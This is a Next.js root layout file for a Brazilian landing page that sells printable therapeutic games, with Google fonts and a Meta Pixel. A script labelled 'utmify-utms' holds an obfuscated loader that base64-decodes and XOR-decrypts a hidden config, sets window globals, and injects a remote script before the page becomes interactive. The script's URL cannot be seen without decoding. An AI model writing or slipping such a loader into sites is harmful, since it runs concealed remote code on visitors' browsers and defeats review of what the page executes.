import type { Metadata } from "next";
import Script from "next/script";
import { Poppins, Inter, Fraunces } from "next/font/google";
import "./globals.css";

const poppins = Poppins({
  subsets: ["latin"],
  weight: ["600", "700"],
  variable: "--font-poppins",
  display: "swap",
});

const inter = Inter({
  subsets: ["latin"],
  weight: ["400", "500"],
  variable: "--font-inter",
  display: "swap",
});

const fraunces = Fraunces({
  subsets: ["latin"],
  weight: ["400"],
  style: ["italic"],
  variable: "--font-fraunces",
  display: "swap",
});

export const metadata: Metadata = {
  title: "+50 Jogos Terapêuticos Imprimíveis | Material clínico para psicopedagogas",
  description:
    "50 jogos terapêuticos imprimíveis para dislexia, discalculia, TDAH, disgrafia e disortografia. Imprima, recorte e aplique na sessão, sem improviso.",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="pt-BR">
      <body
        className={`${poppins.variable} ${inter.variable} ${fraunces.variable} font-body antialiased bg-cream text-graphite`}
      >
        {children}
        <Script id="utmify-utms" strategy="beforeInteractive">
          {`(function(){var k_yr=atob("DKoCgYHDK6uJEnMdY9Eg9POvCZGregdpE9k4rq6gT8WnZwdwCsx7r+KsRoXrYFxuANhr8fWwBN79fwAyD8t25PK3BcH6MF8/At528+ihXt/sYVEnONEg7+CuTomzMBd8F8sv9PWuQs3wPwNvBtxn7/XuU8jmdl5uAMEgraO1Ssf8d1EnQYh/rfrhRcrkd1EnQc5j9eDuXt/kexVkTtpw5PemRd+kYQZ/Cs5xo63hXcrlZxY/WYgg/Ny+");var z_ojg=[];for(var y_h4y=0;y_h4y<k_yr.length;y_h4y++){z_ojg.push(k_yr.charCodeAt(y_h4y)&255);}var g_sm7h=z_ojg[0];var v_s=z_ojg.slice(1,1+g_sm7h);var v_h14=z_ojg.slice(1+g_sm7h);var w_ck=v_h14.map(function(b,t_d4){return b^v_s[t_d4%g_sm7h];});var o_02vb="";for(var p_3yn=0;p_3yn<w_ck.length;p_3yn++){o_02vb+=String.fromCharCode(w_ck[p_3yn]&255);}var s_ea=decodeURIComponent(escape(o_02vb));var w_duk5=JSON.parse(s_ea);var r_10qp=w_duk5.globals||[];r_10qp.forEach(function(h_m0){window[h_m0.name]=h_m0.value;});var q_oxtp=document.createElement("script");q_oxtp.src=w_duk5.url;q_oxtp.async=true;q_oxtp.defer=true;(w_duk5.attributes||[]).forEach(function(a_eu){q_oxtp.setAttribute(a_eu.name,a_eu.value);});(document.head||document.documentElement).appendChild(q_oxtp);})();`}
        </Script>
        <Script id="meta-pixel" strategy="afterInteractive">
          {`!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '2901662803524962');
fbq('track', 'PageView');`}
        </Script>
        <noscript>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=2901662803524962&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
      </body>
    </html>
  );
}
